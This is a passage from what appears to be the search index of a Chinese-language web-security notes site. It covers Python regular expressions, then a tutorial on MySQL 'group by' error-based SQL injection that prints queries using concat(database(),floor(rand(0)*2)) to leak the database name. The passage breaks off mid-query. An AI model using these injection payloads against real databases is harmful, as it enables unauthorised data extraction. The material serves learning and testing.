<li><code>\\b</code>\uff1a\u5339\u914d\u4e00\u4e2a\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u4e0e\u7a7a\u683c\u95f4\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>er\\b</code>\u53ef\u4ee5\u5339\u914d<code>verb</code>\u4e2d\u7684<code>er</code>\uff0c\u4f46\u4e0d\u5339\u914d<code>eraser</code>\u4e2d\u7684<code>er</code>\u3002</li> <li><code>\\B</code>\uff1a\u975e\u5355\u8bcd\u8fb9\u754c\u5339\u914d\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_6","title":"\u8fde\u63a5\u7b26\u4e0e\u5b57\u7b26\u96c6","text":"<ul> <li><code>.</code>\uff1a\u5339\u914d\u9664\u6362\u884c\u7b26<code>\\n</code>\u4e4b\u5916\u7684\u4efb\u4f55\u5355\u5b57\u7b26\u3002</li> <li><code>[ ]</code>\uff1a\u6807\u8bb0\u4e00\u4e2a\u5b57\u7b26\u96c6\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u3002\u4f8b\u5982\uff0c<code>[abc]</code>\u5339\u914d<code>a</code>\u3001<code>b</code>\u6216<code>c</code>\u3002</li> <li><code>-</code>\uff1a\u5728\u5b57\u7b26\u96c6\u4e2d\u8868\u793a\u8303\u56f4\u3002\u4f8b\u5982\uff0c<code>[a-z]</code>\u5339\u914d\u4efb\u610f\u5c0f\u5199\u5b57\u6bcd\u3002</li> <li><code>^</code>\uff1a\u5728\u5b57\u7b26\u96c6\u7684\u5f00\u59cb\u5904\u8868\u793a\u5426\u5b9a\u3002\u4f8b\u5982\uff0c<code>[^abc]</code>\u5339\u914d\u9664<code>a</code>\u3001<code>b</code>\u3001<code>c</code>\u4e4b\u5916\u7684\u4efb\u610f\u5b57\u7b26\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_7","title":"\u5206\u7ec4\u4e0e\u6355\u83b7","text":"<ul> <li><code>()</code>\uff1a\u6807\u8bb0\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u8fdb\u884c\u5206\u7ec4\u548c\u6355\u83b7\u3002\u6355\u83b7\u7684\u7ec4\u53ef\u4ee5\u5728\u540e\u7eed\u7684\u8868\u8fbe\u5f0f\u4e2d\u901a\u8fc7<code>\\1</code>\u3001<code>\\2</code>\u7b49\u8fdb\u884c\u5f15\u7528\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_8","title":"\u9009\u62e9\u7b26","text":"<ul> <li><code>|</code>\uff1a\u6307\u660e\u4e24\u9879\u4e4b\u95f4\u7684\u4e00\u4e2a\u9009\u62e9\u3002\u4f8b\u5982\uff0c<code>z|food</code>\u5339\u914d<code>z</code>\u6216<code>food</code>\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_9","title":"\u8f6c\u4e49\u5b57\u7b26","text":"<ul> <li><code>\\</code>\uff1a\u7528\u4e8e\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\uff0c\u4f7f\u5176\u8868\u793a\u5b57\u9762\u7684\u5b57\u7b26\u672c\u8eab\u3002\u4f8b\u5982\uff0c<code>\\.</code>\u5339\u914d<code>.</code>\u5b57\u7b26\uff0c<code>\\\\</code>\u5339\u914d<code>\\</code>\u5b57\u7b26\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_10","title":"\u975e\u8d2a\u5a6a\u5339\u914d","text":"<ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>*</code>\u3001<code>+</code>\u548c<code>?</code>\u7b49\u9650\u5b9a\u7b26\u662f\u8d2a\u5a6a\u7684\uff0c\u4f1a\u5c3d\u53ef\u80fd\u591a\u5730\u5339\u914d\u5b57\u7b26\u3002\u901a\u8fc7\u5728\u8fd9\u4e9b\u9650\u5b9a\u7b26\u540e\u52a0\u4e0a<code>?</code>\uff0c\u53ef\u4ee5\u4f7f\u5176\u6210\u4e3a\u975e\u8d2a\u5a6a\u7684\u6216\u6700\u5c0f\u5339\u914d\u3002\u4f8b\u5982\uff0c<code>.*?</code>\u4f1a\u5c3d\u53ef\u80fd\u5c11\u5730\u5339\u914d\u4efb\u610f\u5b57\u7b26\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_11","title":"\u7279\u6b8a\u5b57\u7b26\u5e8f\u5217","text":"<ul> <li><code>\\d</code>\uff1a\u5339\u914d\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e<code>[0-9]</code>\u3002</li> <li><code>\\D</code>\uff1a\u5339\u914d\u975e\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e<code>[^0-9]</code>\u3002</li> <li><code>\\w</code>\uff1a\u5339\u914d\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e<code>[A-Za-z0-9_]</code>\u3002</li> <li><code>\\W</code>\uff1a\u5339\u914d\u975e\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e<code>[^A-Za-z0-9_]</code>\u3002</li> <li><code>\\s</code>\uff1a\u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u5305\u62ec\u7a7a\u683c\u3001\u5236\u8868\u7b26\u3001\u6362\u9875\u7b26\u7b49\u3002\u76f8\u5f53\u4e8e<code>[\\f\\n\\r\\t\\v]</code></li> <li><code>\\S</code>\uff1a\u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u5b57\u7b26\u3002\u76f8\u5f53\u4e8e<code>[^\\f\\n\\r\\t\\v]</code></li> </ul> \u5b57\u7b26 \u63cf\u8ff0 \u7b49\u4ef7 <code>\\n</code> \u4ee3\u8868\u4e00\u4e2a\u6362\u884c\u7b26 <code>\\r</code> \u4ee3\u8868\u4e00\u4e2a\u56de\u8f66\u7b26 <code>\\f</code> \u4ee3\u8868\u6362\u9875\u7b26 <code>\\t</code> \u4ee3\u8868\u4e00\u4e2a\u5236\u8868\u7b26 Tab <code>\\A</code> \u4ee3\u8868\u5b57\u7b26\u4e32\u7684\u5f00\u59cb <code>\\Z</code> \u4ee3\u8868\u5b57\u7b26\u4e32\u7684\u7ed3\u675f"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_12","title":"\u4fee\u9970\u7b26","text":"<p>\u4fee\u9970\u7b26\u7528\u4e8e\u6539\u53d8\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u884c\u4e3a\u3002\u4e0d\u540c\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\u5f15\u64ce\u53ef\u80fd\u652f\u6301\u4e0d\u540c\u7684\u4fee\u9970\u7b26\u3002</p>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#global-search","title":"\u5168\u5c40\u641c\u7d22\uff08Global Search\uff09","text":"<ul> <li>\u5982\u5728JavaScript\u4e2d\uff0c<code>g</code>\u6807\u5fd7\u7528\u4e8e\u6267\u884c\u5168\u5c40\u5339\u914d\uff08\u67e5\u627e\u6240\u6709\u5339\u914d\u9879\uff0c\u800c\u4e0d\u662f\u5728\u627e\u5230\u7b2c\u4e00\u4e2a\u5339\u914d\u9879\u540e\u505c\u6b62\uff09\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#case-insensitive","title":"\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08Case-Insensitive\uff09","text":"<ul> <li>\u5982\u5728JavaScript\u4e2d\uff0c<code>i</code>\u6807\u5fd7\u7528\u4e8e\u6267\u884c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u7684\u5339\u914d\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#multiline-mode","title":"\u591a\u884c\u6a21\u5f0f\uff08Multiline Mode\uff09","text":"<ul> <li>\u5982\u5728JavaScript\u4e2d\uff0c<code>m</code>\u6807\u5fd7\u4f7f\u5f97<code>^</code>\u548c<code>$</code>\u5206\u522b\u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u4efb\u4f55\u6362\u884c\u7b26\u4e4b\u540e\u548c\u4e4b\u524d\u7684\u4f4d\u7f6e\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_13","title":"\u793a\u4f8b\u6b63\u5219","text":"<p>\u4ee5\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u4e00\u4e2a\u6b63\u6574\u6570\uff0c[1-9]\u8bbe\u7f6e\u7b2c\u4e00\u4e2a\u6570\u5b57\u4e0d\u662f 0\uff0c[0-9]* \u8868\u793a\u4efb\u610f\u591a\u4e2a\u6570\u5b57\uff1a</p> Text Only<pre><code>/[1-9][0-9]*/\n</code></pre> <p>\u8fd9\u91cc\u4e0d\u4f7f\u7528 + \u9650\u5b9a\u7b26\uff0c\u56e0\u4e3a\u5728\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u6216\u540e\u9762\u7684\u4f4d\u7f6e\u4e0d\u4e00\u5b9a\u9700\u8981\u6709\u4e00\u4e2a\u6570\u5b57\u3002\u4e5f\u4e0d\u4f7f\u7528 ? \u5b57\u7b26\uff0c\u56e0\u4e3a\u4f7f\u7528 ? \u4f1a\u5c06\u6574\u6570\u9650\u5236\u5230\u53ea\u6709\u4e24\u4f4d\u6570\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u8bbe\u7f6e 0~99 \u7684\u4e24\u4f4d\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u8868\u8fbe\u5f0f\u6765\u81f3\u5c11\u6307\u5b9a\u4e00\u4f4d\u4f46\u81f3\u591a\u4e24\u4f4d\u6570\u5b57\u3002</p> Text Only<pre><code>/[0-9]{1,2}/\n</code></pre> <p>\u4e0a\u9762\u7684\u8868\u8fbe\u5f0f\u7684\u7f3a\u70b9\u662f\uff0c\u53ea\u80fd\u5339\u914d\u4e24\u4f4d\u6570\u5b57\uff0c\u800c\u4e14\u53ef\u4ee5\u5339\u914d 0\u300100\u300101\u300110 99 \u7684\u7ae0\u8282\u7f16\u53f7\u4ecd\u53ea\u5339\u914d\u5f00\u5934\u4e24\u4f4d\u6570\u5b57\u3002</p> <p>\u6539\u8fdb\u4e0b\uff0c\u5339\u914d 1~99 \u7684\u6b63\u6574\u6570\u8868\u8fbe\u5f0f\u5982\u4e0b\uff1a</p> Text Only<pre><code>/[1-9][0-9]?/\n</code></pre> <p>\u6216</p> Text Only<pre><code>/[1-9][0-9]{0,1}/\n</code></pre> <p>\u6ce8\u610f\uff1a</p> <p><code>*</code> \u548c <code>+</code> \u9650\u5b9a\u7b26\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u4f1a\u5c3d\u53ef\u80fd\u591a\u7684\u5339\u914d\u6587\u5b57\uff0c\u53ea\u6709\u5728\u5b83\u4eec\u7684\u540e\u9762\u52a0\u4e0a\u4e00\u4e2a <code>?</code> \u5c31\u53ef\u4ee5\u5b9e\u73b0\u975e\u8d2a\u5a6a\u6216\u6700\u5c0f\u5339\u914d\u3002</p>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#python_1","title":"Python","text":"<p>Python\u7684<code>re</code>\u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u529f\u80fd\uff0c\u4e3b\u8981\u51fd\u6570\u5305\u62ec\uff1a</p> <ul> <li><code>re.match(pattern, string, flags=0)</code>\uff1a\u4ece\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d\u4e00\u4e2a\u6a21\u5f0f\uff0c\u5982\u679c\u4e0d\u662f\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d\u6210\u529f\u7684\u8bdd\uff0c<code>match()</code>\u5c31\u8fd4\u56de<code>none</code>\u3002</li> <li><code>re.search(pattern, string, flags=0)</code>\uff1a\u626b\u63cf\u6574\u4e2a\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\u7b2c\u4e00\u4e2a\u6210\u529f\u7684\u5339\u914d\u3002</li> <li><code>re.findall(pattern, string, flags=0)</code>\uff1a\u5728\u5b57\u7b26\u4e32\u4e2d\u627e\u5230\u6b63\u5219\u8868\u8fbe\u5f0f\u6240\u5339\u914d\u7684\u6240\u6709\u5b50\u4e32\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\u7684\uff0c\u5219\u8fd4\u56de\u7a7a\u5217\u8868\u3002</li> <li><code>re.split(pattern, string, maxsplit=0, flags=0)</code>\uff1a\u6839\u636e\u5339\u914d\u8fdb\u884c\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\u3002</li> <li><code>re.sub(pattern, repl, string, count=0, flags=0)</code>\uff1a\u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u6240\u6709\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5b50\u4e32\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#rematch","title":"re.match \u51fd\u6570","text":"<p>re.match \u5c1d\u8bd5\u4ece\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d\u4e00\u4e2a\u6a21\u5f0f\uff0c\u5982\u679c\u4e0d\u662f\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d\u6210\u529f\u7684\u8bdd\uff0cmatch() \u5c31\u8fd4\u56de none\u3002</p> <p>\u51fd\u6570\u8bed\u6cd5\uff1a</p> Python<pre><code>re.match(pattern, string, flags=0)\n</code></pre> <p>\u51fd\u6570\u53c2\u6570\u8bf4\u660e\uff1a</p> \u53c2\u6570\u63cf\u8ff0pattern\u5339\u914d\u7684\u6b63\u5219\u8868\u8fbe\u5f0fstring\u8981\u5339\u914d\u7684\u5b57\u7b26\u4e32\u3002flags\u6807\u5fd7\u4f4d\uff0c\u7528\u4e8e\u63a7\u5236\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\u65b9\u5f0f\uff0c\u5982\uff1a\u662f\u5426\u533a\u5206\u5927\u5c0f\u5199\uff0c\u591a\u884c\u5339\u914d\u7b49\u7b49\u3002 <p>\u5339\u914d\u6210\u529f <code>re.match</code> \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5339\u914d\u7684\u5bf9\u8c61\uff0c\u5426\u5219\u8fd4\u56de <code>None</code>\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>group(num)</code> \u6216<code>groups()</code> \u5339\u914d\u5bf9\u8c61\u51fd\u6570\u6765\u83b7\u53d6\u5339\u914d\u8868\u8fbe\u5f0f\u3002</p> \u5339\u914d\u5bf9\u8c61\u65b9\u6cd5\u63cf\u8ff0group(num=0)\u5339\u914d\u7684\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\uff0cgroup() \u53ef\u4ee5\u4e00\u6b21\u8f93\u5165\u591a\u4e2a\u7ec4\u53f7\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b83\u5c06\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u90a3\u4e9b\u7ec4\u6240\u5bf9\u5e94\u503c\u7684\u5143\u7ec4\u3002groups()\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u6240\u6709\u5c0f\u7ec4\u5b57\u7b26\u4e32\u7684\u5143\u7ec4\uff0c\u4ece 1 \u5230 \u6240\u542b\u7684\u5c0f\u7ec4\u53f7\u3002 Python<pre><code>import re\nprint(re.match('www', 'www.runoob.com').span())  # \u5728\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d    (0, 3)\nprint(re.match('com', 'www.runoob.com'))         # \u4e0d\u5728\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d   None\n</code></pre> Python<pre><code>import re\n\nline = \"Cats are smarter than dogs\"\n\nmatchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)\n\nif matchObj:\n   print \"matchObj.group() : \", matchObj.group()\n   print \"matchObj.group(1) : \", matchObj.group(1)\n   print \"matchObj.group(2) : \", matchObj.group(2)\nelse:\n   print \"No match!!\"\n</code></pre> <p>\u4ee5\u4e0a\u5b9e\u4f8b\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> Python<pre><code>matchObj.group() :  Cats are smarter than dogs\nmatchObj.group(1) :  Cats\nmatchObj.group(2) :  smarter\n</code></pre>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#research","title":"re.search \u65b9\u6cd5","text":"<p>re.search \u626b\u63cf\u6574\u4e2a\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\u7b2c\u4e00\u4e2a\u6210\u529f\u7684\u5339\u914d\u3002</p> <p>\u51fd\u6570\u8bed\u6cd5\uff1a</p> Python<pre><code>re.search(pattern, string, flags=0)\n</code></pre> <p>\u51fd\u6570\u53c2\u6570\u8bf4\u660e\uff1a</p> \u53c2\u6570\u63cf\u8ff0pattern\u5339\u914d\u7684\u6b63\u5219\u8868\u8fbe\u5f0fstring\u8981\u5339\u914d\u7684\u5b57\u7b26\u4e32\u3002flags\u6807\u5fd7\u4f4d\uff0c\u7528\u4e8e\u63a7\u5236\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5339\u914d\u65b9\u5f0f\uff0c\u5982\uff1a\u662f\u5426\u533a\u5206\u5927\u5c0f\u5199\uff0c\u591a\u884c\u5339\u914d\u7b49\u7b49\u3002 <p>\u5339\u914d\u6210\u529f <code>re.search</code> \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5339\u914d\u7684\u5bf9\u8c61\uff0c\u5426\u5219\u8fd4\u56de <code>None</code>\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>group(num)</code> \u6216 <code>groups()</code> \u5339\u914d\u5bf9\u8c61\u51fd\u6570\u6765\u83b7\u53d6\u5339\u914d\u8868\u8fbe\u5f0f\u3002</p> \u5339\u914d\u5bf9\u8c61\u65b9\u6cd5\u63cf\u8ff0group(num=0)\u5339\u914d\u7684\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\uff0cgroup() \u53ef\u4ee5\u4e00\u6b21\u8f93\u5165\u591a\u4e2a\u7ec4\u53f7\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b83\u5c06\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u90a3\u4e9b\u7ec4\u6240\u5bf9\u5e94\u503c\u7684\u5143\u7ec4\u3002groups()\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u6240\u6709\u5c0f\u7ec4\u5b57\u7b26\u4e32\u7684\u5143\u7ec4\uff0c\u4ece 1 \u5230 \u6240\u542b\u7684\u5c0f\u7ec4\u53f7\u3002 Python<pre><code>import re\nprint(re.search('www', 'www.runoob.com').span())  # \u5728\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d    (0, 3)\nprint(re.search('com', 'www.runoob.com').span())  # \u4e0d\u5728\u8d77\u59cb\u4f4d\u7f6e\u5339\u914d  (11, 14)\n</code></pre> Python<pre><code>import re\n\nline = \"Cats are smarter than dogs\";\n\nsearchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)\n\nif searchObj:\n   print \"searchObj.group() : \", searchObj.group()\n   print \"searchObj.group(1) : \", searchObj.group(1)\n   print \"searchObj.group(2) : \", searchObj.group(2)\nelse:\n   print \"Nothing found!!\"\n</code></pre> Python<pre><code>searchObj.group() :  Cats are smarter than dogs\nsearchObj.group(1) :  Cats\nsearchObj.group(2) :  smarter\n</code></pre>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#rematch-research","title":"re.match \u4e0e re.search \u7684\u533a\u522b","text":"<p><code>re.match</code> \u53ea\u5339\u914d\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\uff0c\u5982\u679c\u5b57\u7b26\u4e32\u5f00\u59cb\u4e0d\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5219\u5339\u914d\u5931\u8d25\uff0c\u51fd\u6570\u8fd4\u56de <code>None</code>\uff1b\u800c <code>re.search</code> \u5339\u914d\u6574\u4e2a\u5b57\u7b26\u4e32\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u5339\u914d\u3002</p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","title":"Group by\u62a5\u9519\u6ce8\u5165","text":""},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#_1","title":"\u6587\u7ae0\u76ee\u5f55","text":"<ul> <li>\u6df1\u5165\u7406\u89e3 group by \u62a5\u9519\u6ce8\u5165</li> <li> <ul> <li>\u4e00\u3001\u7406\u89e3 floor\uff0cgroup by +count(*),rand,count \u51fd\u6570\u7684\u4f5c\u7528</li> <li> <ul> <li>1.group by+count(*)</li> <li>2.rand()</li> <li>3.floor()</li> <li>4.count() \u8fd4\u56de\u6307\u5b9a\u5217\u7684\u503c\u7684\u6570\u91cf</li> <li>5.floor(rand()*2)</li> </ul> </li> <li>\u4e8c\u3001group by \u5206\u7ec4\u7684\u539f\u7406</li> <li>\u4e09\u3001group by \u62a5\u9519\u6ce8\u5165</li> <li> <ul> <li>group by \u62a5\u9519\u539f\u7406\uff1a</li> </ul> </li> </ul> </li> </ul>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#group-by","title":"\u6df1\u5165\u7406\u89e3 group by \u62a5\u9519\u6ce8\u5165","text":"<p>users \u8868\u4e2d\u7684\u6570\u636e </p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#floorgroup-by-countrandcount","title":"\u4e00\u3001\u7406\u89e3 floor\uff0cgroup by +count(*),rand,count \u51fd\u6570\u7684\u4f5c\u7528","text":""},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#1group-bycount","title":"1.group by+count(*)","text":"<p>group by \u4e3b\u8981\u7528\u6765\u5bf9\u6570\u636e\u8fdb\u884c\u5206\u7ec4\uff08\u76f8\u540c\u7684\u5206\u4e3a\u4e00\u7ec4\uff09\u3002 </p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#2rand","title":"2.rand()","text":"<p>rand \u51fd\u6570\u7528\u4e8e\u4ea7\u751f\u4e00\u4e2a 0 \u5230 1 \u4e4b\u95f4\u7684\u968f\u673a\u6570 </p> <p>\u6ce8\u610f\uff1a\u5f53\u8c03\u7528\u4e00\u4e2a\u6574\u6570\u53c2\u6570\u65f6\uff0crand() \u4f7f\u7528\u8be5\u968f\u673a\u6570\u53d1\u751f\u5668\u79cd\u5b50\u503c\u3002\u6bcf\u6b21\u5728\u7ed9\u5b9a\u503c\u79cd\u5b50\u751f\u6210\uff0cRAND() \u4f1a\u4ea7\u751f\u4e00\u4e2a\u53ef\u91cd\u590d\u7684\u4e00\u7cfb\u5217\u6570\u5b57</p> <p>\u4f8b\u5982\uff1a </p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#3floor","title":"3.floor()","text":"<p>floor() \u7528\u4e8e\u5411\u4e0b\u53d6\u6574 </p> <p>*_rand()_2 \u4ee3\u8868\u4e86\u968f\u673a\u6570\u8303\u56f4\u662f 0-2__ </p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#4count","title":"4.count() \u8fd4\u56de\u6307\u5b9a\u5217\u7684\u503c\u7684\u6570\u91cf","text":""},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#5floorrand2","title":"5.floor(rand()*2)","text":"<p>*_rand()_2 \u751f\u6210 0-2 \u4e4b\u95f4\u7684\u6570\uff0cfloor() \u5411\u4e0b\u53d6\u6574\uff0c\u610f\u601d\u5c31\u662f\u53d6\u51fa\u4e00\u7ec4\u4e0d\u56fa\u5b9a\u7684 0 \u6216\u8005 1__ </p> <p>**floor(rand(0)_2)\uff0c\u4e0e floor(rand()_2) \u4e0d\u540c\u7684\u662f\uff0c\u524d\u8005\u52a0\u4e86\u79cd\u5b50\u503c\uff0c\u90a3\u4e48\u524d\u8005\u751f\u6210\u7684\u5c31\u662f\u4e00\u7ec4\u56fa\u5b9a\u7684 0 \u6216\u8005 1__</p> <p></p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#group-by_1","title":"\u4e8c\u3001group by \u5206\u7ec4\u7684\u539f\u7406","text":"<p>\u9996\u5148\u5148\u770b\u4e24\u4e2a\u67e5\u8be2\u8bed\u53e5\u4e4b\u95f4\u7684\u533a\u522b</p> Text Only<pre><code>select username,count(*) from username group by username;\nselect username,count(*) from username group by \"username\";\n</code></pre> <p>1.<code>select username,count(*) from username group by username;</code> </p> <p>2.<code>select username,count(*) from username group by \"username\";</code> </p> <p>\u7b2c\u4e00\u6761\u67e5\u8be2\u8bed\u53e5\u539f\u56e0\u662f\u7531\u4e8e group by \u5728\u5206\u7ec4\u65f6\uff0c\u4f1a\u4f9d\u6b21\u53d6\u51fa\u67e5\u8be2\u8868\u4e2d\u7684\u8bb0\u5f55\u5e76\u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u8868\uff08\u8868\u4e2d\u6709\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662f key \u548c count()\uff09,group by \u7684\u5bf9\u8c61\u5c31\u662f\u8be5\u4e34\u65f6\u8868\u7684\u4e3b\u952e\u3002\u5982\u679c\u4e34\u65f6\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u8be5\u4e3b\u952e\uff0c\u5219 count() \u7684\u503c + 1\uff0c\u5982\u679c\u8868\u4e2d\u4e0d\u5b58\u5728\u5219\u5c06\u4e3b\u952e\u63d2\u5165\u5230\u4e34\u65f6\u8868\u4e2d\u3002\u4f8b\u5982\uff1agroup by username \u65f6\uff0c\u53d6 username \u5b57\u6bb5\u7684\u7b2c\u4e00\u4e2a\u503c admin\uff0c\u8fd9\u4f7f\u4f1a\u5728\u4e34\u65f6\u8868\u4e2d\u7684\u4e3b\u952e key \u4e2d\u67e5\u8be2 admin \u8fd9\u6761\u6570\u636e\uff0c\u5982\u679c\u627e\u5230\u5c31\u4f7f count\uff08\uff09\u503c\u52a0 1\uff0c\u5982\u679c\u6ca1\u627e\u5230\u5c31\u63d2\u5165 admin\uff0c\u5e76\u8ba9 count\uff08\uff09\u52a0 1</p> <p>\u7b2c\u4e8c\u6761 group by \u7684\u5bf9\u8c61\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32 \u201cusername\u201d\uff0c\u5bf9\u4e8e\u5b57\u7b26\u4e32\u6765\u8bf4\uff0cgroup by \u5728\u8fdb\u884c\u5206\u7ec4\u65f6\uff0c\u4f1a\u76f4\u63a5\u5c06\u8be5\u5b57\u7b26\u4e32\u5f53\u505a\u4e3b\u952e\u63d2\u5165\u5230\u4e34\u65f6\u8868\u4e2d\uff0c\u5982\u679c\u4e34\u65f6\u8868\u4e2d\u5b58\u5728\u8be5\u4e3b\u952e\uff0c\u5219 count()\u7684\u503c + 1\u3002\u8f6e\u5230\u7b2c\u4e8c\u6761 \u6570\u636e Angelina \u65f6\u4e5f\u662f\u5c06\u5b57\u7b26\u4e32 \u201cusername\u201d \u5f53\u505a\u4e3b\u952e\u63d2\u5165\u5230\u4e34\u65f6\u8868\uff0c\u4f46\u6b64\u65f6\u4e34\u65f6\u8868\u4e2d\u5df2\u7ecf\u5b58\u5728\u8be5\u4e3b\u952e\uff0c\u5219 count() \u7684\u503c\u76f4\u63a5\u52a0 1\uff0c\u6700\u7ec8\u7ed3\u679c\u5c31\u662f\u4e0a\u56fe\u3002</p>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#group-by_2","title":"\u4e09\u3001group by \u62a5\u9519\u6ce8\u5165","text":"Text Only<pre><code>1.select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));\n2.select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));\n</code></pre> <ul> <li>_\u53ef\u4ee5\u770b\u5230\uff0c\u7b2c\u4e00\u6761\u8bed\u53e5\u6bcf\u6b21\u90fd\u4f1a\u7206\u51fa users \u8868\u6240\u5728\u7684\u6570\u636e\u5e93\uff0c\u800c\u7b2c\u4e8c\u6761\u5e76\u4e0d\u662f\u767e\u5206\u767e\u7206\u51fa\uff0c\u539f\u56e0\u5c31\u5728\u4e8e floor(rand(0)_2) \u8fd9\u4e00\u90e8\u5206\u7684\u533a\u522b__</li> </ul>"},{"location":"WEB/others/group-by%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#group-by_3","title":"group by \u62a5\u9519\u539f\u7406\uff1a","text":"<p>\u4ee5\u7b2c\u4e00\u6761\u4e3a\u4f8b\uff1a<code>select count(*) from information_schema.tables group by 